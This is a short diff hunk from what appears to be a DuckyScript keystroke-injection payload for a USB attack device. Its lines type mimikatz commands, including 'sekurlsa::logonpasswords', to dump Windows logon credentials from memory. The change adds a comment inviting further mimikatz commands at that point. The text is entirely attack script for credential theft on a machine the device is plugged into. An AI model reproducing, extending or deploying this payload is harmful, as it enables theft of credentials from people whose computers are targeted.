@@ -27,6 +27,7 @@ DELAY 750
 STRING log
 ENTER
 DELAY 750
+REM You can add extra commands in mimikatz from this point on
 STRING sekurlsa::logonpasswords
 ENTER
 STRING exit
